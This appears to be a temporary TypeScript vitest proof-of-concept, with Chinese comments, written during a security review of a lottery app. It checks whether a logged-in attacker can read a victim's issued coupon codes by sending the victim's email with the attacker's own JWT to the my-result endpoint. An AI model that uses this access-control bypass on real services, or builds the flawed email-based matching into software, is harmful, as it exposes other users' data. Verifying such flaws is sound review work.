/**
 * 临时验证脚本（审查用，验证后立即删除）：
 * my-result 在 registered 模式下 couponMatchKey = 请求体 email（未与 JWT 用户绑定），
 * 验证任意登录用户是否能用受害者邮箱读到受害者的 issued 券码。
 */
import { describe, it, expect, beforeAll, afterEach } from "vitest";
import { Hono } from "hono";
import type { AppEnv } from "../bindings";
import { publicLotteryRoute } from "../routes/public-lottery";
import { signJwt } from "../middleware/auth";
import { lotteryDraws, lotteryEntries, couponCodes, users } from "../db/schema";
import { clearTestData, getTestDb } from "../test-setup";

let db: Awaited<ReturnType<typeof getTestDb>>["db"];
let client: Awaited<ReturnType<typeof getTestDb>>["client"];

beforeAll(async () => {
  ({ client, db } = await getTestDb());
});
afterEach(async () => {
  await clearTestData(client);
});

const TENANT = "tmp-leak-tenant";
const TEST_ENV = {
  TURSO_URL: "",
  ASSETS: { fetch: async () => new Response("", { status: 404 }) } as unknown as Fetcher,
  JWT_SECRET: "test-jwt-secret-0123456789abcdef",
};

function futureTimeISO(minutes: number): string {
  const d = new Date();
  d.setSeconds(0, 0);
  d.setMinutes(d.getMinutes() + minutes);
  return d.toISOString();
}

function createPublicTestApp() {
  const app = new Hono<AppEnv>();
  app.use("*", async (c, next) => {
    c.set("db", db);
    await next();
  });
  app.route("/public", publicLotteryRoute);
  return app;
}

describe("TMP：registered my-result 券码归属", () => {
  it("攻击者用自己的 JWT + 受害者邮箱查询 my-result", async () => {
    const app = createPublicTestApp();
    const victimEmail = "victim@test.com";
    const victimId = crypto.randomUUID();
    const attackerId = crypto.randomUUID();
    const drawId = crypto.randomUUID();

    await db.insert(users).values([
      { id: victimId, username: "victim", email: victimEmail, emailVerified: 1, passwordHash: "h" },
      { id: attackerId, username: "attacker", email: "attacker@test.com", emailVerified: 1, passwordHash: "h" },
    ]);
    await db.insert(lotteryDraws).values({
      id: drawId, tenantId: TENANT, publicSlug: "tmp-leak-draw",
      title: "券归属验证", status: "drawn", participationMode: "registered",
      activityKind: "lottery", experienceType: "wheel", resultMode: "manual",
      startAt: futureTimeISO(-60), endAt: futureTimeISO(-10),
      winnerCount: 1, createdAt: new Date().toISOString(), updatedAt: new Date().toISOString(),
    });
    // 受害者参与并持有 issued 券
    await db.insert(lotteryEntries).values({
      id: crypto.randomUUID(), tenantId: TENANT, drawId,
      identityType: "user_id", identityValue: victimId, joinedAt: new Date().toISOString(),
    });
    await db.insert(couponCodes).values({
      id: crypto.randomUUID(), tenantId: TENANT, drawId,
      code: "VICTIM-COUPON-1", label: "invite", status: "issued",
      recipientEmail: victimEmail,
    });

    // 攻击者：自己的合法 JWT（sub=attackerId），请求体 email 填受害者邮箱
    const token = await signJwt({ sub: attackerId }, TEST_ENV.JWT_SECRET, 3600);
    const res = await app.request("/public/draws/tmp-leak-draw/my-result", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${token}`,
        "CF-Connecting-IP": "10.9.9.9",
      },
      body: JSON.stringify({ email: victimEmail, code: "" }),
    }, TEST_ENV);

    const body = await res.json() as any;
    expect(res.status).toBe(200);
    expect(body.ok).toBe(true);
    // 攻击者自己没有 entry
    expect(body.joined).toBe(false);
    // 断言：若泄漏成立，coupons 会包含受害者券码
    expect(body.coupons).toEqual(["VICTIM-COUPON-1"]);
  });
});
